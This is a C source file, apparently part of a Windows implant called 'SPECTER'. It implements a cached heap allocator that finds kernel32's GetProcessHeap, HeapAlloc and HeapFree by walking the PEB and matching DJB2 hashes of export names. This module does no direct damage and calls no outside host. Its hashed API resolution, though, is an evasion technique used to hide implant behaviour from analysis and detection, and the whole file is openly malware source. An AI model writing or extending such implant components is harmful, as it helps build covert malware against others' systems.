/**
 * SPECTER Implant — Cached Heap Allocator
 *
 * Resolves GetProcessHeap, HeapAlloc, HeapFree once via PEB walk,
 * then caches the heap handle and function pointers.  Every subsequent
 * allocation/free goes straight through the cached pointers — no PEB
 * walk overhead per call.
 *
 * Thread-safety: the implant is single-threaded, so no locking needed.
 */

#include "specter.h"
#include "peb.h"
#include "heap.h"

/* Function pointer types (ms_abi for Win64 ABI) */
typedef HANDLE (__attribute__((ms_abi)) *fn_GetProcessHeap)(void);
typedef PVOID  (__attribute__((ms_abi)) *fn_HeapAlloc)(HANDLE, DWORD, SIZE_T);
typedef BOOL   (__attribute__((ms_abi)) *fn_HeapFree)(HANDLE, DWORD, PVOID);

/* DJB2 hashes — same as task_exec.c used previously */
#define HASH_GETPROCESSHEAP     0xDA077562
#define HASH_HEAPALLOC          0xB1CE974E
#define HASH_HEAPFREE           0xBF94BC05

/* Cached state — resolved once, reused for all allocations */
static HANDLE         g_cached_heap  = NULL;
static fn_HeapAlloc   g_cached_alloc = NULL;
static fn_HeapFree    g_cached_free  = NULL;

BOOL init_heap_cache(void) {
    if (g_cached_heap) return TRUE;

    PVOID k32 = find_module_by_hash(HASH_KERNEL32_DLL);
    if (!k32) return FALSE;

    fn_GetProcessHeap pGPH = (fn_GetProcessHeap)find_export_by_hash(k32, HASH_GETPROCESSHEAP);
    g_cached_alloc         = (fn_HeapAlloc)find_export_by_hash(k32, HASH_HEAPALLOC);
    g_cached_free          = (fn_HeapFree)find_export_by_hash(k32, HASH_HEAPFREE);

    if (!pGPH || !g_cached_alloc || !g_cached_free) return FALSE;

    g_cached_heap = pGPH();
    return g_cached_heap != NULL;
}

PVOID heap_alloc_cached(DWORD size) {
    if (!g_cached_heap && !init_heap_cache()) return NULL;
    return g_cached_alloc(g_cached_heap, 0x08, size);  /* HEAP_ZERO_MEMORY */
}

void heap_free_cached(PVOID ptr) {
    if (!ptr || !g_cached_heap) return;
    g_cached_free(g_cached_heap, 0, ptr);
}
